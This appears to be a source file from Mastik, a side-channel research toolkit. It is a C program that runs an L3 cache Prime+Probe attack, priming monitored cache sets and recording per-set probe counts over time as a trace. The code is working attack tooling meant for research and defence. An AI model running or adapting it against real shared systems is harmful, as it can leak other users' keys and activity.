/*
 * Copyright 2016 CSIRO
 *
 * This file is part of Mastik.
 *
 * Mastik is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Mastik is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Mastik.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <strings.h>

#include <util.h>
#include "l3.h"

// CPU cycles in MHz
#define CPUMHZ 3200

// Sample rate in msec
#define SLOT 2

// Step size for cache probes. That is, probe every STEP cache sets
//synchronize with l3.c
#define STEP 2

#define SLOTCYCLES (SLOT * 1000 * CPUMHZ)

#define SETS_PER_PAGE 64


#define EXPANSION 64
//#define EXPANSION 1
// comment the previous line and uncomment the following line to easily disable the index expansion
//#define EXPANDED_INDEX(index) (index)
#define EXPANDED_INDEX(index)  (((index) &0x1f ) | (((index )& ~0x1f)<<6))



int main(int ac, char **av) {
  char str[20];
  int sample_time=30000;
  int samples;

  if(ac>1 ){
      sample_time = atoi(av[1]);
    }
int nsets;
  l3pp_t l3 = NULL;

  do {
	  
    if (l3 != NULL)
      l3_release(l3);
    l3 = l3_prepare(NULL);
    nsets = l3_getSets(l3);
  } while (nsets != 8192);

  samples = sample_time / SLOT;
  int nmonitored = nsets/STEP;
  for (int i = 0; i < nsets; i += STEP)
    l3_monitor(l3, i);
  l3_randomise(l3);
  uint16_t *res = calloc(samples * SETS_PER_PAGE/STEP*EXPANSION, sizeof(uint16_t));
  for (int i = 0; i < samples * SETS_PER_PAGE/STEP ; i+= 1)
    res[EXPANDED_INDEX(i)] = 1;
  // prime the cache
  l3_probecount(l3, res);

  // The actual attack
  l3_repeatedprobecount(l3, samples, res, SLOTCYCLES);
  for (int j = 0; j < SETS_PER_PAGE/STEP; j++){ 
    for (int i = 0; i < samples; i++)
        printf("%u ", res[ EXPANDED_INDEX(i*SETS_PER_PAGE/STEP+j)]);
    putchar('\n');
  }


	
  free(res);
  l3_release(l3);
}
